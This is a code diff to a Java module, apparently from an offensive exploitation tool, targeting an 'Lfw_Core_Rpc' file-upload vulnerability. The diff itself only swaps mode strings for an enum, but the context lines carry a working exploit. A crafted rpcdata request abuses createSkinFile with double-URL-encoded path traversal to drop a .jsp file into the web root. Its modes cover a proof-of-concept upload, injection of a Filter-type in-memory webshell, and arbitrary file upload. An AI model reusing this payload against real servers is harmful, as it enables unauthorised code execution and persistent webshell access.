@@ -1,6 +1,7 @@
 package com.chave.vuln;
 
-import com.chave.bean.Config;
+import com.chave.config.Config;
+import com.chave.config.Mod;
 import com.chave.proxy.HttpProxy;
 import com.chave.utils.HttpUtil;
 import com.chave.utils.SSLUtil;
@@ -10,7 +11,6 @@ import javafx.scene.control.TextArea;
 import java.io.UnsupportedEncodingException;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.net.URLEncoder;
 
 public class Lfw_Core_Rpc_Upload extends VulnBase {
     public static boolean DNSLOG = false;
@@ -41,15 +41,15 @@ public class Lfw_Core_Rpc_Upload extends VulnBase {
         String postData = null;
 
         // 生成最终上传数据
-        if (Config.MOD.equals("poc")) {
+        if (Config.MOD.equals(Mod.POC)) {
             filename = System.currentTimeMillis() + ".jsp";
             data_base = "setdebugmode=2&&rpcdata={\"rpcname\":\"nc.uap.portal.service.itf.IPortalSpecService\",\"method\":\"createSkinFile\",\"params0\":\"webapps%25%32%66nc_web%25%32%66\",\"params1\":\"%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66\",\"params2\":\"%25%32%65%25%32%65%25%32%66\",\"params3\":\"%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66\",\"params4\":\"" + filename + "\",\"params5\":\"";
             postData = data_base + poc_data;
-        } else if (Config.MOD.equals("exp")) {
+        } else if (Config.MOD.equals(Mod.EXP)) {
             filename = System.currentTimeMillis() + ".jsp";
             data_base = "setdebugmode=2&&rpcdata={\"rpcname\":\"nc.uap.portal.service.itf.IPortalSpecService\",\"method\":\"createSkinFile\",\"params0\":\"webapps%25%32%66nc_web%25%32%66\",\"params1\":\"%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66\",\"params2\":\"%25%32%65%25%32%65%25%32%66\",\"params3\":\"%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66\",\"params4\":\"" + filename + "\",\"params5\":\"";
             postData = data_base + exp_data;
-        } else if (Config.MOD.equals("upload")) {
+        } else if (Config.MOD.equals(Mod.UPLOAD)) {
             filename = Config.FILENAME;
             data_base = "setdebugmode=2&&rpcdata={\"rpcname\":\"nc.uap.portal.service.itf.IPortalSpecService\",\"method\":\"createSkinFile\",\"params0\":\"webapps%25%32%66nc_web%25%32%66\",\"params1\":\"%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66\",\"params2\":\"%25%32%65%25%32%65%25%32%66\",\"params3\":\"%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66\",\"params4\":\"" + filename + "\",\"params5\":\"";
             // 文件内容需要经过两次url编码
@@ -96,47 +96,47 @@ public class Lfw_Core_Rpc_Upload extends VulnBase {
                 String response2 = HttpUtil.getResponseText(conn2);
 
                 if (responseCode2 == HttpURLConnection.HTTP_OK) {
-                    if (response2.contains(flag) && Config.MOD.equals("poc")) {
+                    if (response2.contains(flag) && Config.MOD.equals(Mod.POC)) {
                         logMessage("[+] Lfw_Core_Rpc 文件上传漏洞存在! 成功上传测试文件: " + fileUrl);
                         return;
-                    } else if (response2.contains(flag) && Config.MOD.equals("exp")) {
+                    } else if (response2.contains(flag) && Config.MOD.equals(Mod.EXP)) {
                         logMessage("[+] Filter 类型内存马注入成功, 请手动连接验证.");
                         return;
-                    } else if (Config.MOD.equals("upload")) {
+                    } else if (Config.MOD.equals(Mod.UPLOAD)) {
                         logUpload("[+] 文件上传成功! 文件地址: " + fileUrl);
                         return;
                     }
                 } else {
-                    if (Config.MOD.equals("poc")) {
+                    if (Config.MOD.equals(Mod.POC)) {
                         logMessage("[-] Lfw_Core_Rpc 文件上传失败, 请尝试手动验证漏洞.");
                         return;
-                    } else if (Config.MOD.equals("exp")) {
+                    } else if (Config.MOD.equals(Mod.EXP)) {
                         logMessage("[-] 内存马注入失败, 请手动验证漏洞.");
                         return;
-                    } else if (Config.MOD.equals("upload")) {
+                    } else if (Config.MOD.equals(Mod.UPLOAD)) {
                         logUpload("[-] 文件上传失败, 请手动验证漏洞.");
                         return;
                     }
                 }
 
             } else {
-                if (Config.MOD.equals("poc")) {
+                if (Config.MOD.equals(Mod.POC)) {
                     logMessage("[-] Lfw_Core_Rpc 文件上传失败, 请尝试手动验证漏洞.");
                     return;
-                } else if (Config.MOD.equals("exp")) {
+                } else if (Config.MOD.equals(Mod.EXP)) {
                     logMessage("[-] 内存马注入失败, 请手动验证漏洞.");
                     return;
-                } else if (Config.MOD.equals("upload")) {
+                } else if (Config.MOD.equals(Mod.UPLOAD)) {
                     logUpload("[-] 文件上传失败, 请手动验证漏洞.");
                     return;
                 }
             }
             conn1.disconnect();
         } catch (Exception e) {
-            if (Config.MOD.equals("poc") || Config.MOD.equals("exp")) {
+            if (Config.MOD.equals(Mod.POC) || Config.MOD.equals(Mod.EXP)) {
                 logMessage("[-] Lfw_Core_Rpc 文件上传失败, 请手动验证漏洞. " + e);
                 return;
-            } else if (Config.MOD.equals("upload")) {
+            } else if (Config.MOD.equals(Mod.UPLOAD)) {
                 logUpload("[-] Lfw_Core_Rpc 文件上传失败, 请手动验证漏洞. " + e);
                 return;
             }
